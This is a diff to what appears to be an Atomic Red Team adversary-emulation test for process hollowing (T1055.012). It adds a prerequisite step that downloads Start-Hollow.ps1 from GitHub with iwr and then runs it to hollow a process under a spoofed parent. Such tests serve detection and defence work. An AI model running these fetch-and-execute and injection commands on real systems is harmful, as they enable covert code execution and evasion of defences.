@@ -9,6 +9,14 @@ atomic_tests:
   supported_platforms:
   - windows
   input_arguments:
+    script_download_url:
+      description: Download url for Start-Hollow.ps1
+      type: string
+      default: https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/720d8fe82396faf74f2ca19a3fe99a5c262a14b9/Start-Hollow.ps1
+    script_path:
+      description: Path to Start-Hollow.ps1
+      type: path
+      default: PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1
     hollow_binary_path:
       description: Path of the binary to hollow (executable that will run inside the sponsor)
       type: string
@@ -27,12 +35,25 @@ atomic_tests:
       default: notepad
   executor:
     command: |
-      . "$PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1"
+      . "#{script_path}"
       $ppid=Get-Process #{parent_process_name} | select -expand id
       Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose
     cleanup_command: |
       Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
     name: powershell
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Start-Hollow.ps1 must be installed
+    prereq_command: |
+      if (Test-Path "#{script_path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      try {
+        iwr "#{script_download_url}" -OutFile (New-Item -Path #{script_path} -Force)
+      } catch {
+        Write-Error $_
+        Exit 1
+      }
 - name: RunPE via VBA
   auto_generated_guid: 3ad4a037-1598-4136-837c-4027e4fa319b
   description: |
